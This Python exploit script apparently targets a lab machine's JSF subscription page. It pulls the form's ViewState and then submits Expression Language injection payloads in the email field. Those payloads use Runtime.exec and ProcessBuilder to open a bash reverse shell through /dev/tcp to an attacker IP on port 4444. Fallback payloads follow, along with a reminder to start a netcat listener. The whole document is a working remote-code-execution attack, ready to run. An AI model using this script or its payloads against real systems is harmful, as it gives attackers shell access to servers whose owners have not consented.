#!/usr/bin/env python3

import requests
import urllib.parse
import time

TARGET = "http://10.129.228.116:8080/userSubscribe.faces"
ATTACKER_IP = "10.10.16.187"
ATTACKER_PORT = "4444"

# Disable SSL warnings
import urllib3
urllib3.disable_warnings()

session = requests.Session()
session.verify = False

print("=" * 60)
print("JSF EL INJECTION RCE PAYLOAD")
print("=" * 60)
print(f"[*] Target: {TARGET}")
print(f"[*] Attacker: {ATTACKER_IP}:{ATTACKER_PORT}")
print()

# Step 1: Get real ViewState
print("[STEP 1] Fetching real ViewState...")
try:
    r = session.get(TARGET, timeout=10)
    
    import re
    # Extract ViewState from form
    vs_match = re.search(r'value="([a-zA-Z0-9+/=]+)"\s*/>', r.text)
    
    if vs_match:
        real_viewstate = vs_match.group(1)
        print(f"[+] ViewState: {real_viewstate[:50]}...")
    else:
        print("[-] Could not extract ViewState!")
        exit(1)
        
except Exception as e:
    print(f"[-] Error fetching page: {e}")
    exit(1)

# Step 2: Craft RCE payload
print("\n[STEP 2] Crafting RCE payload...")

# Method 1: Direct Runtime.exec() via bash
rce_payload = f'${{Runtime.getRuntime().exec(new String[]{{"/bin/bash","-c","bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1"}})}}'

print(f"[*] Payload: {rce_payload[:80]}...")

# Step 3: Send payload
print("\n[STEP 3] Sending RCE payload...")

data = {
    "j_id_jsp_1623871077_1:email": rce_payload,
    "j_id_jsp_1623871077_1:submit": "SIGN UP",
    "j_id_jsp_1623871077_1_SUBMIT": "1",
    "javax.faces.ViewState": real_viewstate,
}

try:
    print("[*] Sending POST request...")
    r = session.post(TARGET, data=data, timeout=15)
    
    print(f"[+] Response status: {r.status_code}")
    print(f"[+] Response length: {len(r.text)}")
    
    if r.status_code in [200, 500]:
        print("[!] Payload delivered!")
        print("[!] Check your netcat listener for shell...")
        
except Exception as e:
    print(f"[-] Error: {e}")

# Step 4: Alternative payloads if first doesn't work
print("\n[STEP 4] Trying alternative payloads...")

alternative_payloads = [
    # Method 2: Using ProcessBuilder
    f'${{new java.lang.ProcessBuilder(new String[]{{"/bin/bash","-c","bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1"}}).start()}}',
    
    # Method 3: Simple bash reverse shell
    f'${{Runtime.getRuntime().exec("/bin/bash -c bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1")}}',
    
    # Method 4: Touch a file to test execution
    f'${{Runtime.getRuntime().exec("touch /tmp/pwned")}}',
]

for i, payload in enumerate(alternative_payloads):
    print(f"\n[*] Trying alternative payload {i+1}...")
    
    data = {
        "j_id_jsp_1623871077_1:email": payload,
        "j_id_jsp_1623871077_1:submit": "SIGN UP",
        "j_id_jsp_1623871077_1_SUBMIT": "1",
        "javax.faces.ViewState": real_viewstate,
    }
    
    try:
        r = session.post(TARGET, data=data, timeout=10)
        print(f"[+] Status: {r.status_code}")
        
        if r.status_code == 500:
            print("[!] Server error - might be executing!")
            
    except Exception as e:
        print(f"[-] Error: {e}")

print("\n" + "=" * 60)
print("[*] All payloads sent!")
print("[*] Check your listener: nc -nlvp 4444")
print("=" * 60)
